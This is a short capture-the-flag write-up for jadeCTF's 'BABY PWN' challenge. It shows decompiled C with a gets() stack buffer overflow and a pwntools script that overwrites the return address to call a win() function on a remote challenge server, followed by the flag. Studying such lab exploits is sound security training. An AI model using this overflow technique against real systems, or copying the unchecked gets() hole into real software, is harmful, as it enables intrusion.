# BABY PWN
We are given a binary.  
On analyzing it with Ghidra, we find the `start_program()` function:
```c
void start_program(void)

{
  char local_208 [512];
  
  puts("Enter your name:");
  gets(local_208);
  printf("Hello %s, welcome to jadeCTF!\n",local_208);
  return;
}
```
This is a simple Buffer Overflow. There is also a `win()` function which we need to call:
```c
void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Nice job :)");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Sorry, flag doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  printf("Here is your flag: %s\n",local_78);
  return;
}
```
We can overflow the `local_208` variable and call the `win()` function to get the flag. The solve script:
```py
from pwn import *

BINARY = "chall"

context.binary = BINARY
elf = context.binary

# p = elf.process()
p = remote("34.76.206.46", 10002)

OFFSET = 0x200 + 8

payload = cyclic(OFFSET)
payload += p64(elf.symbols["win"])

p.sendlineafter(b"Enter your name:\n", payload)
p.interactive()
```
FLAG: `jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}`